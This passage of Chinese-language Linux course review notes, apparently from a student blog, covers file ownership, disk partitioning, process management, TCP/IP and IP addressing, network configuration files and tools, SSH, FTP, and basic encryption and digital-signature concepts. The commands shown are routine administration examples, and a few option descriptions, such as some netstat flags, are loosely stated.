&#x2F;&#x2F;改变a.cpp文件的归属用户组迭代：chown -cR abc test &#x2F;&#x2F;修改目录中所有文件的归属<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chgrp专门修改文件或目录的归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chgrp -c abc a.cpp &#x2F;&#x2F;修改文件的归属组为abcchgrp -cR abc test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h4 id="P127-磁盘概述"><a href="#P127-磁盘概述" class="headerlink" title="P127: 磁盘概述"></a>P127: 磁盘概述</h4><p>配置文件/etc/fstab 查看磁盘分区的情况及别名</p><p>没有实际的硬盘。<font color=Brown><strong>主分区/主挂载点的别名是/dev/sda1</strong>，即“/”挂载点</font>。/dev/sda5表示逻辑分区，虚拟设备：<font color=Brown><strong>/dev/scd0光驱</strong></font>，<font color=Brown><strong>/dev/fd0软驱</strong></font>。SWAP<font color=Brown><strong>交换分区被挂载至/root/swapfile</strong></font></p><p>/dev/后面部分表示一个具体的分区，hd表示IDE硬盘，sd表示SATA硬盘或其他外部设备，had中的第3位a表示这是该类型接口上的第1个设备。每一个IDE接口可以允许有两个设备，一个是主设备，另一个为从设备，可以分别用hda、hdb表示第1个IDE接口上的两个设备。</p><p><font color=Brown><strong>/dev/hda1~/dev/hda4都表示主分区</strong></font>，<font color=Brown><strong>/dev/hda5表示该硬盘上的第1个逻辑分区</strong></font>，分区的顺序是不能随意修改。</p><h4 id="P128-磁盘管理方法"><a href="#P128-磁盘管理方法" class="headerlink" title="P128: 磁盘管理方法"></a>P128: 磁盘管理方法</h4><ul><li><p><strong>fdisk 磁盘分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fdisk &#x2F;dev&#x2F;hda &#x2F;&#x2F;对IDE硬盘进行分区fdisk -l &#x2F;&#x2F;列出当前操作系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>mkfs</strong> 在分区上<strong>建立文件系统</strong>或格式化指定形式</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkfs -v &#x2F;&#x2F;显示命令使用方法mkfs -V &#x2F;&#x2F;显示版本信息mkfs -t ext3 &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;将&#x2F;dev&#x2F;sda3的文件系统建立为ext3类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mkswap 设置交换分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkswap -c -vl &#x2F;dev&#x2F;sda5 102400 &#x2F;&#x2F;在&#x2F;dev&#x2F;sda5建立大小为100MB的交换分区，建立前先检查是否有损坏的区块<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>df 显示磁盘信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">df -a &#x2F;&#x2F;显示所有的磁盘信息-l 仅显示本地的文件系统信息 -i 显示索引节点信息df -t ext3 &#x2F;&#x2F;显示系统中ext3类型的分区信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>du 显示目录的容量</strong></p><pre class="line-numbers language-none"><code class="language-none">du -a &#x2F;root &#x2F;&#x2F;显示&#x2F;root目录下每个文件的大小，以K为单位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P193-195-进程管理"><a href="#P193-195-进程管理" class="headerlink" title="P193-195: 进程管理"></a>P193-195: 进程管理</h4><p><font color=Brown><strong>什么是进程？什么是程序？进程有什么特点？父子进程的关系？</strong></font></p><p><strong><font color=Brown>进程的3种类型，基本信息(PID,PPID…)，3种基本状态(state,wait,running)</font></strong></p><p><strong>1.进程的概念：</strong></p><p>Ubuntu Linux 的所有任务都是在操作系统内核的调度下由CPU执行，很多时候，Linux是将任务和进程的慨念合在一起。<strong>进程的标准定义: 进程是可开发执行的程序在一个数据集合上的运行过程。</strong>进程是一个动态的使用系统资源，处于活动状态的应用程序。<strong>进程和程序有着显著的区别。</strong></p><ul><li>程序是静态概念，本身可以作为一种资源长期保存在磁盘上;进程是一个程序的执行过程,是动态概念,有一定的生命周期，如果进程一旦执行结束，就不再存在于操作系统中</li><li>进程是一个能独立运行的单位，能与其他进程并发执行，它是操作系统中资源申请调度的最小单位;而程序不能作为一个独立运行的单位，它也不占用CPU 资源</li><li>程序并不是和进程一一对应的 一个程序可以由多个进程共用,一个进程也可以在活动中有顺序地执行多个程序</li></ul><p>在Ubuntu Linux中，init进程是所有进程的发起者和控制者，每个进程都有一个编号<strong>PID</strong>，是进程在当前系统中运行的顺序。<strong>Init用于终结父进程</strong>，如果该进程出现了问题，操作系统会崩溃。</p><p>因为init进程在系统运行期间始终不会消亡或停止，所以系统总是可以确信它的存在，并在必要的时候以此为参照。因此，<strong>系统调用fork()函数来创建一个新进程</strong>，并且作为init的子进程，从而最终形成系统中运行的所有其他进程。</p><p>为了标识和管理进程，使用PCB进程控制块来进行此项重要工作。进程有以下几个主要参数：</p><ul><li><font color=Brown>PID</font>：进程号，唯一标识进程（父进程为1）        Process ID</li><li><font color=Brown>PPID</font>：父进程号，创建某个进程的上一个进程号      Parent PID</li><li>USER：启动某个进程的用户ID(UID)和该用户归属的组ID(GID)       </li><li>STAT：进程状态。一个进程可能处于多种状态，包括运行状态、等待状态（可被中断或不可被中断）、停止状态、睡眠状态和僵死状态等</li><li>PRIORITY：优先级</li><li>资源占用：占用系统资源</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">- ps aux  &#x2F;&#x2F;查看当前所有运行着的进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><font color=Brown>Ubuntu Linux进程的3种类型：</font></strong></p><ul><li>交互进程：由Shell启动的进程</li><li>批处理进程：与终端联系不大，在等待队列中按序执行</li><li>守护进程：后台运行的进程，一般总是活动状态</li></ul><p>2.<font color=Brown><strong>进程的运行状态</strong></font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212115553914.png" alt="image-20230212115553914" style="zoom:67%;" /><ul><li>等待状态wait：该状态有两种模式，一种是可被中断的，另一种不可被中断。这种状态下的进程处于等待系统分配给它资源，如果一旦得到资源，将转入就绪状态。</li><li>就绪状态running：这种状态的进程当前没有运行,但所有申请的资源已经具备。只要内核对其进行调度，将立即拥有CPU的控制权，开始运行。</li><li>僵死状态zombie：也称僵尸状态或僵尸进程。这种状态下的进程已经运行完毕，执行了相应的任务，已经不再存在，但它的父进程留下了一个记录，包括一个退出码和一些时间信息等。</li><li>停止状态stop：正在运行的进程由于某些原因的影响而退出，将进入停止状态，例遇到更高优先级的进程占用了CPU资源。</li><li>中断状态interupt</li></ul><blockquote><p>进程状态60</p></blockquote><p>3.进程管理操作</p><ul><li><p><strong>ps 查看系统进程信息（静态信息）</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-f:产生某个进程的一个完整信息清单。-a:显示所有用户的进程清单。-u:产生某个特定用户的进程清单。-x:显示后台运行进程。ps &#x2F;&#x2F;显示与控制终端相关进程的基本信息ps -u abc -f &#x2F;&#x2F;显示abc用户所有完整信息ps aux &#x2F;&#x2F;显示系统中的所有进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>top 动态显示运行中的进程详细信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">top -d 3 &#x2F;&#x2F;每3秒动态更新进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>nice 设置进程运行优先级</strong></p><p>每个进程都有一个优先级参数，表示占有CPU资源的等级，优先级越高进程更容易获取CPU控制权。进程优先级一般为-20~19，-20为最高优先级。修改进程nice值，可以修改进程优先级。系统进程默认的优先级是0。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nice -5 process &#x2F;&#x2F;优先级置为5。若没有指定默认置为10nice --12 process &#x2F;&#x2F;优先级置为-12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong><font  color="blue">renice 修改进程的优先级</font></strong></p><p>可调范围-20~19</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo renice 12 7716 &#x2F;&#x2F;修改PID7716的进程的优先级为12sudo renice 6 -u abc &#x2F;&#x2F;修改abc用户所有进程优先级为6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>kill 终止进程命令</p><p>一般情况，可以通过停止一个进程的方法来正常结束该进程。但在某种情况下，进程没有响应，可使用kill命令停止某个活动。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kill -STOP 4385 &#x2F;&#x2F;停止4385进程，但不退出kill -CONT 4385 &#x2F;&#x2F;重新开始4385进程kill -9 4385 &#x2F;&#x2F;强制终止4385进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>killall 终止所有同名进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">killall -9 process &#x2F;&#x2F;终止系统中所有名为process的进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P200-临时工作安排at"><a href="#P200-临时工作安排at" class="headerlink" title="P200: 临时工作安排at"></a>P200: 临时工作安排at</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212141653461.png" alt="image-20230212141653461" style="zoom: 50%;" /><ol><li><p>服务启动</p><p>at命令用来安排完成临时性工作，即只需要执行一次的系统任务。使用该命令，需要提前启动一个进程，即启动一个服务。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo &#x2F;etc&#x2F;init.d&#x2F;atd restart  &#x2F;&#x2F;重新启动at服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用at命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo at 23:50 2009-12-15 &#x2F;&#x2F;在2009-12-15的23：50执行以下命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>维护当前系统中的at服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo atq &#x2F;&#x2F;查询当前系统中的所有at进程sudo atrm 1 &#x2F;&#x2F;删除1号工作任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p><strong>周期性工作安排cron</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps1.jpg" alt="img" style="zoom:67%;" /> </center>#### P211: TCP/IP基础<p>（尽可能写全面）</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221016160838763.png" alt="image-20221016160838763" style="zoom:80%;" /><ul><li><p><strong>网络接口层</strong>（Network Interface Physical)：模型的基层，负责数据帧的发送和接收（帧Frame是独立的网络信息传输单元)。网络接口层将帧格式的数据放到网络上，或从网上把帧取下来。</p></li><li><p><strong>互联层（Internet）</strong>：互联协议将数据包封装成Internet 数掂包（IP packet)，并运行必要的路由算法。这里有4种互联协议。</p><ul><li><strong>网际协议(IP)</strong>:负责在主机和网络之间路径寻址和路由数据包。</li><li><strong>地址解析协议（ARP)</strong>:获取同一物理网络中的硬件主机地址。</li><li><strong>因特网控制消息协议（(ICMP)</strong>:发送消息，并报告有关数据包的传送错误。</li><li><strong>互联组管理协议（IGMP)</strong>:实现本地多路广播路由器报告。</li></ul></li><li><p><strong>传输层</strong>:传输协议在主机之间提供通信会话。传输协议的选择根据数据传输方式而定。主要有以下两个传输协议。</p><ul><li>传输控制协议(<strong>TCP</strong>)：为应用程序提供<strong>可靠的</strong>通信连接。适合于一次传输<strong>大批数据</strong>的情况，并适用于要求得到响应的应用程序。</li><li>用户数据包协议（<strong>UDP</strong>）:提供了无连接通信，且不对传送包进行可靠性确认。适合于一次传输<strong>小量数据</strong>可靠性则由应用层确认。</li></ul></li><li><p><strong>应用层</strong>:应用程序通过这一层访问网络，主要包括常见的FTP、HTTP、DNS和 TELNET等协议。</p><ul><li><strong>Telnet</strong>:提供远程登录(终端仿真）服务。</li><li><strong>FTP</strong>:提供应用级的文件传送协议。,</li><li><strong>SMTP</strong>:简单邮件传送协议。</li><li><strong>SNMP</strong>:简单网络管理协议，使用传输层UDP 协议。</li><li><strong>DNS</strong>:域名解析服务，也就是将域名映像成IP地址的协议，使用传输层UDP协议。</li><li><strong>HTTP</strong>:超文本传输协议，访问Web所用的协议。</li></ul></li></ul><p>TCP/IP协议簇体系结构及各层协议结构如图。 在网络接口层，最重要的信息之一是主机的MAC地址，为48bit，在物理上唯一标识某台主机；IP层的IP地址在逻辑上唯一标识某台主机；在主机内部，传输层的端口对应唯一的应用服务。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212134419401.png" alt="image-20230212134419401" style="zoom:67%;" /><h4 id="P212-IP地址表示形式及分类"><a href="#P212-IP地址表示形式及分类" class="headerlink" title="P212: IP地址表示形式及分类"></a>P212: IP地址表示形式及分类</h4><p>1.表示形式：</p><ul><li><p>二进制表示法</p></li><li><p>点分十进制表示法</p><p>IP地址由网络号和主机号组成，程度为4字节</p><ul><li>网络号：标识一个物理的网络，同一个网络上的所有主机使用同一个网络号，该号在互联网中是唯一的。</li><li>主机号：确定网络中的一个工作端、服务器、路由器或者其他TCP/IP 主机。对于同一个网络号来说，主机号是唯一的。每个TCP/IP主机由一个逻辑IP地址确定网络号和主机号。</li></ul></li></ul><p>2.IP地址分类</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212135517579.png" alt="image-20230212135517579" style="zoom:50%;" /><ul><li><strong>A类地址</strong>: 可以拥有最大数量的主机，最高位为0，紧跟的7位表示网络号，其余24位表示主机号，总共允许有 126个网络。</li><li><strong>B类地址</strong>: 被分配到中等规模和大规候的网络中，最高两位总被置为二进制的10，前16位为网络号，后16位 为主机号，允许有16384个网络。</li><li><strong>C类地址</strong>：高3为被置为二进制的110，前 24位为网络号，后8位为主机号，允许有大约200万个网络。</li><li>D类地址:被用于多路广播组用户，高4位总被置为1110,余下的位用于标明客户机所属的组。</li><li>E类地址是一种仅供试验的地址。</li></ul><p>几条准则：</p><ul><li>网络号不能为127。该标识号被保留作为回路及诊断功能。</li><li>不能将网络号和主机号的各位均置为1。如果每位都是1,该地址会被解释为网内广播而不是一个主机号</li><li>各位均不能置0，否则该地址被解释为“就是本网络”。</li><li>对于本网络来说，主机号应核唯一，否则会出现IP地址已分配或有冲突的错</li></ul><p><strong>网络划分标准</strong></p><h4 id="P217-TCP包头"><a href="#P217-TCP包头" class="headerlink" title="P217: TCP包头"></a>P217: TCP包头</h4><p>cat /usr/include/linux/tcp.h</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221150069.png" alt="image-20230212221150069" style="zoom: 67%;" /><ol><li>源端口和目标端口(Source Port&amp;Destinaton Port):传送/接收数据使用的端口。</li><li>数据包序号(Sequence Number)：数据包过大而进行分段后，记录数据包序号，接收方可以组合成功</li><li>回应序号 (Acknowledge Number):为了确认接收端收到发送端所送出的数据包数据,发送端希望能吸收到接收端的响应。</li><li><strong>数据补偿（Data Offset):补偿位。</strong></li><li>保留位（Reserved ):未使用的保留字段。</li><li>控制标志码（Control Flag):当进行网络连接时，必须说明这个联机的状态，使接收端了解这个数据包的主要动作。这个子段为6bits，分别代表6个句柄，若为1则为启动。说明如下所示。<ul><li> URG （Urgent)）: 为1表示该数据包为紧急数据包，接收端应该紧急处理。</li><li>ACK (Acknowledge):为1表示这个数据包为确认数据包，与Acknowledge Number有关</li><li>PSH (Push function):为1表示要求对方立即传送缓冲区内的其他对应数据包，而无须等待缓冲区满。</li><li>RST （Reset):为1表示联机会马上结束，而无须等待终止确认手续。这是个强制结束的联机,且发送端已断线。</li><li>SYN (Svnchronous):为1表示发送端希望双方建立同步处理，即要求建立联机。通常带有SYN标志的数据包表示“主动”要连接到对方的意思。</li></ul></li><li><strong>滑动窗口</strong>（Window):用于控制数据包的流量，可以告知对方目前有多少缓冲区容量(Receive Buffer)可以接收数据包。当Window=0时，表示缓冲器已经额满。</li><li><strong>确认校验码</strong>（Checksum);数据由发送端送出前会进行一个检验的动作，并将该动作的检验值标注在这个字段上。而接收者收到这个数据包之后，会再次对数据包进行验证，并且与原来发送的确认校验码值进行对比,如果相符就接收，若不符就认为该数据包已经损毁，要求对方</li><li><strong>紧急信息</strong> （Urgent Pointer ):该字段在 Code字段内的URG值为1时才会产生作用，告知紧急数据所在的位置。</li><li>任意资料（Options）</li></ol><h4 id="P220-ARP-RARP概念"><a href="#P220-ARP-RARP概念" class="headerlink" title="P220: ARP/RARP概念"></a>P220: ARP/RARP概念</h4><p>任何一台主机（确切的说是任何一个网络适配器）在物理上唯一的标识是48bit适配器的地址，即MAC地址 ( Media Access Controladdress)。这个地址保存在网络适配器的ROM中，是不能修改的。在实际应用中,田户可 以为任意一个网络适配器指定不同的IP地址。</p><p>MAC地址是所有网络活动的基础,但是网上的主机之间的通信是通过IP地址讲行的,因此在这个过程中就存在一个转换，即MAC地址与IP地址的对应，实现这一地址解析的协议为ARP(地址解析协议）和RARP（逆地址解析协议）。</p><ul><li>ARP为IP地址到对应的硬件MAC 地址之间提供动态映射，这个过程是自动完成的,一般应用程序或系统管理员不必操作中间流程。</li><li>RARP用于那些没有磁盘驱动器的系统（一般是无盘工作站或X终端)，它需要系统管理员进行手工设置，提供MAC地址到IP地址的解析。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221237222.png" alt="image-20230212221237222" style="zoom: 80%;" /><h4 id="P225-227-网络配置文件"><a href="#P225-227-网络配置文件" class="headerlink" title="P225-227: 网络配置文件"></a>P225-227: 网络配置文件</h4><p>Ubuntu Linux为适应不同需求，在进行网络访问时，需要配置网络配置文件，这些配置文件位于”/etc“目录下。</p><p><strong>1./etc/network/interfaces网络基本信息配置文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;etc&#x2F;network&#x2F;interfaces&#x2F;&#x2F;lo接口的配置信息1 auto lo &#x2F;&#x2F;系统开机时，自动启动lo接口2 iface lo inet loopback &#x2F;&#x2F;设置lo接口的地址信息，此处设置为本地回环(loopback)3&#x2F;&#x2F;系统中一块网卡eth0接口的配置信息&#x2F;&#x2F;一个网卡对应一个地址的基本配置方法：4 auto eth0 &#x2F;&#x2F;系统开机时，自动启动eth0接口，该接口为系统默认的第一块网卡所在的接口5 iface eth0 inet dhcp &#x2F;&#x2F;设置eth0接口的地址信息，此处设置为动态自动获取(dhcp)6 address 192.168.1.21 &#x2F;&#x2F;设置eth0接口的一个静态IP地址为192.168.1.217 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0接口的子网掩码为255.255.255.08 gateway 192.168.1.1 &#x2F;&#x2F;设置eth0接口的静态网关地址为192.168.1.1&#x2F;&#x2F;同一个物理网卡设备上有多个地址的基本配置方法：11 auto eth0 eth0:112 iface eth0 inet static13 address 192.168.1.10014 netmask 255.255.255.015 gateway 192.168.1.1 16 iface eth0:1 inet static17 address 192.168.1.20018 netmask 255.255.255.019 gateway 192.168.1.1 &#x2F;&#x2F;不同接口上配置多个网卡的基本配置方法：21 auto eth0 eth122 iface eth0 inet static23 address 192.168.0.12524 netmask 255.255.255.025 gateway 192.168.1.1 26 iface eth1 inet static27 address 192.168.0.13728 netmask 255.255.255.029 gateway 192.168.1.1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(auto lo)</p><p><strong>2.其他网络相关配置文件</strong></p><p>（考基本的端口号）</p><ul><li><p>/etc/hosts 主机名映射文件</p><p>在网络上实现域名和IP地址的映射的两种方法：大量域名解析采用DNS服务器，小型网络可使用/etc/hosts文件提供解析。文件包含部分常用IP地址和主机名/主机名别名之间的映射</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;文件种没有tom主机信息，因此会登陆失败。添加tom记录：$ sudo vim &#x2F;etc&#x2F;hosts127.0.0.1 localhost127.0.1.1 abc &#x2F;&#x2F;当前用户192.168.1.93 netservice.webservice.bamms.com tom&#x2F;&#x2F;登录主机$ftp tom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/host.conf 配置名称解析器</p><pre class="line-numbers language-none"><code class="language-none">$ cat &#x2F;etc&#x2F;host.conforder hosts,bindmulti on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>”order”指定主机名查询顺序，其参数用逗号隔开的查找方法。支持的查找方法为bind和hosts，分别代表DNS、/etc/hosts，此处规定先查询/etc/hosts文件，然后再使用DNS来解析域名</p></li><li><p><font color=Brown><strong>/etc/services 端口映射文件</strong></font></p><p>(判断)</p><pre class="line-numbers language-none"><code class="language-none">ftp-data 20&#x2F;tcpftp 21&#x2F;tcpfsp 21&#x2F;udp  fspdssh 22&#x2F;tcptelnet 23&#x2F;tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/resolv.conf 配置DNS客户</p></li></ul><h4 id="P228-P233-常用网络管理工具"><a href="#P228-P233-常用网络管理工具" class="headerlink" title="P228-P233: 常用网络管理工具"></a>P228-P233: 常用网络管理工具</h4><ul><li><p><strong>ifconfig 配置网络地址信息</strong></p><p>显示或临时配置当前主机某张网卡的IP地址。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0(网卡) ifconfig eth0 &#x2F;&#x2F;查看eth0的网络情况ifconfig eth0 up&#x2F;down &#x2F;&#x2F;激活或关闭eth0ifconfig eth0 192.168.0.25 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>nslookup 域名解析测试</strong></p><p>查询一台机器的IP地址和其对应的域名，使用权限为所有用户，它一般需要一台域名服务器来提供域名服务。“&gt;”后输入查询IP地址，“exit”退出。</p></li><li><p><strong>ping 测试网络状态</strong></p><p>测试网络是否可达。“Time out”主机不可达，若数据包丢失严重则说明网络很不稳定。</p><pre class="line-numbers language-none"><code class="language-none">ping www.baidu.com -c 3 &#x2F;&#x2F;发送三个数据包来测试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ip 网络配置工具</p><p>ip [options] object [ command [arguments] ]</p><ul><li><p>options参数</p><ul><li>-v 打印iproute信息</li><li>-r 将ip地址转换成域名</li><li>-s 输出详细结果</li></ul></li><li><p>object 管理对象</p><ul><li>Link 网络接口设备，通常网卡</li><li>Address IP地址</li><li>Neighbour ARP记录</li><li>Rule 路由策略</li></ul><p>……</p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo ip addr add 192.168.44.122 dev eth0 &#x2F;&#x2F;添加IP地址到eth0网卡上sudo ip rule add from 192.168.0.25 prio 32777 reject &#x2F;&#x2F;丢弃源地址属于192.168.0.25网络的所有数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>netstat</strong></p><p>用来显示活动的TCP连接、计算机侦听端口、以太网统计信息、IP路由表、IPv4统计信息(IP,ICMP,TCP,UDP)以及IPv6统计信息(TCP,UDP)。</p><ul><li>-a  所有</li><li>-e 以太网的统计信息</li><li>-n 活动的TCP连接，数字形式</li><li>-o 活动的TCP连接</li><li>-p 协议</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netstat -p -tcp &#x2F;&#x2F;查看tcp协议类型的连接netstat -p -tcp -udp &#x2F;&#x2F;仅显示TCP和UDP协议的统计信息netstat -o 5 &#x2F;&#x2F;每5秒显示一次活动的TCP连接和进程IDnetstat -n Co &#x2F;&#x2F;以数字形式显示活动的TCP连接和进程IDnetstat -e -s &#x2F;&#x2F;显示以太网统计信息和所有协议的统计信息netstat -a &#x2F;&#x2F;显示处于监听状态的所有端口neystat -ln &#x2F;&#x2F;显示当前主机监听的所有端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>ftp 访问命令</strong></p><p>用来进行远程文件传输。是标准的文件传输协议的用户接口，是TCP/IP网络计算机之间传输文件的简单有效的方法，允许传输ASCII和二进制文件。</p><p>ftp [-dignv] [主机名称IP地址]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ftp&gt;命令ls &#x2F;&#x2F;列出远程机的当前目录cd &#x2F;&#x2F;在远程机上改变工作目录lcd &#x2F;&#x2F;在本地机上改变工作目录close &#x2F;&#x2F;终止当前的ftp会话hash &#x2F;&#x2F;每次传输完数据缓冲区中的数据后就显示一个#号get (mget) &#x2F;&#x2F;从远程机传送指定文件到本地机put (mput) &#x2F;&#x2F;从本地机传送指定文件到远程机quit &#x2F;&#x2F;断开与远程机的连接，并退出ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>route 路由设置</p></li></ul><h4 id="P250：SSH服务使用"><a href="#P250：SSH服务使用" class="headerlink" title="P250：SSH服务使用"></a>P250：SSH服务使用</h4><p>SSH远程登录，端口号22</p><p><strong>安装SSH软件包</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps3.jpg" alt="img" style="zoom: 67%;" /> </center>启动服务，使用netstat监听ssh服务状态<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps4.jpg" alt="img" style="zoom:67%;" /> </center>打开命令行输入ssh **用户@ip**进行远程连接<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps5.jpg" alt="img" style="zoom: 50%;" /> </center>#### P255: 信息安全基础<p>例：什么是数字签名，什么是网络攻击，网络传输特性，是否具有保密性，什么是安全性</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/D1D3D1E4122B157885510E5764E3F031.jpg" alt="img" style="zoom: 25%;" /><p>网络攻击：</p><ul><li>中断：正在传输的信息被中止。</li><li>截获：在传输的过程中被其他窃听者获取敏感信息。</li><li>修改：正在传输的信息被其他人修改后再发送给接收方。</li><li>捏造：网络上的其他非法用户以真实用户的名义发送虚假信息。</li></ul><p>网络传输特性：</p><ul><li>Integrity（完整性):实现数据完整地传输给对方，即在传输的过程中不被修改。</li><li>Confidentiality（保密性):保证信息在传输的过程中不被其他人窃听获取。</li><li>Availability（可用性):网络上的服务器可以实时被利用。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212223644220.png" alt="image-20230212223644220" style="zoom:50%;" /><p>加密方式：</p><ul><li><p>对称加密（单钥）</p><ul><li>同一个密钥去加密和解密数据。发送方在发送信息前使用密钥（只有发送方和接收方知道）对数据进行加密，然后传输密文给接收方，接收方使用同样的密钥来解密密文，得到明文信息。</li><li>好处：算法成熟，易于实现；弊端：密钥管理</li><li>DES, 3DES, AES</li></ul></li><li><p>非对称加密（双钥）</p><ul><li>发送方在发送信息前使用接收方的公钥（所有人都知道）进行加密，然后传输密文给接收方，接收方使用自己的私钥（只有接收方自己知道）来解密密文，得到明文信息。</li><li>好处：不进行密钥传输，降低密钥管理风险；弊端：算法实现难度，速度慢</li><li>背包算法，RSA</li></ul><p>一般使用非对称方式加密密钥进行数据传输，使用传递的密钥来加密数据。</p></li></ul><p>数字签名：</p><p>解决问题：发送方否认问题，即发送方否认发送过某一信息；接收方否认问题，即接收方否认接收到某个消息</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212224831381.png" alt="image-20230212224831381" style="zoom: 50%;" /><ul><li><p>消息加密:整个消息的密文作为认证符。</p></li><li><p>消息认证码:MAC消息和密钥的公开函数，产生定长的值作为认证符。</p></li><li><p>Hash 函数:将任意长的消息映射为定长的 hash值的公开函数，以该hash值作为认证符。目前主要使用的数字签名算法有以下几种:</p></li><li><p>RSA算法:是目前应用最广泛的数字签名，Linux 下的 OpenSSH 中即使用这一算法。DSA (Digital Signature Algorithm）算法:基于有限域上的离散对数问题即 DSS（数字签名标准)。</p></li><li><p>GOST 算法:俄罗斯采用的数字签名标准算法。</p></li></ul><h4 id="P266-FTP"><a href="#P266-FTP" class="headerlink" title="P266: FTP"></a>P266: FTP</h4><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps2.jpg" alt="img" style="zoom: 50%;" /> </center>**主要功能：**<ol><li>不同等级的使用者。<ul><li>实体账号 real user</li><li>访客 guest</li><li>匿名登录者 anonymous</li></ul></li><li>命令记录与登录文件记录</li><li>限制或解除使用者所在的根目录。（提高安全性）</li></ol><p><strong>用户分类：</strong></p><ul><li>实体用户(Real 